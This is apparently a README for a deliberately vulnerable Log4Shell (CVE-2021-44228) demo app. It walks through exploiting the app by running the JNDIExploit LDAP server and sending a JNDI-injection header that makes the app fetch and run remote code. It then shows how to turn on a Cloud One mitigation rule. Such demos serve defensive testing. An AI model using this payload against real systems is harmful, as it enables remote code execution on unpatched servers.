# Log4Shell sample vulnerable application (CVE-2021-44228), protected by Cloud One Application Security

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/), and was modified to add Trend Micro's Cloud One Application Security agent to demonstrate technique-based web application protection to this vulnerability.

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t log4shell-vulnerable-app-c1as
docker run --rm -d -p 8080:8080 --name log4shell-vulnerable-app-c1as log4shell-vulnerable-app-c1as
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server

```bash
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip #(looks down, try https://transfer.sh/puxohI/JNDIExploit.v1.2.zip)
unzip JNDIExploit.v1.2.zip
nohup java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888 &
```

* Then, trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```

## Protection with Cloud One Application Security

This assumes you have (already integrated the agent to your application.)[https://cloudone.trendmicro.com/docs/application-security/install-agent/]

1. Log into Trend Micro Cloud One and navigate to Application Security.
2. Select "Group's Policy" on the left-hand menu and find your application's Group.
3. Enable "Remote Command Execution" if not already enabled.
4. Click the hamburger icon for "Configure Policy" and then click the " < INSERT RULE > " icon.
5. Input ```(?s).*``` in the "Enter a pattern to match" field and hit "Submit" and "Save Changes."
6. Double-check that "Mitigate" is selected in your "Remote Command Execution" line item.



## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
https://success.trendmicro.com/solution/000289940
https://www.trendmicro.com/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html


## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
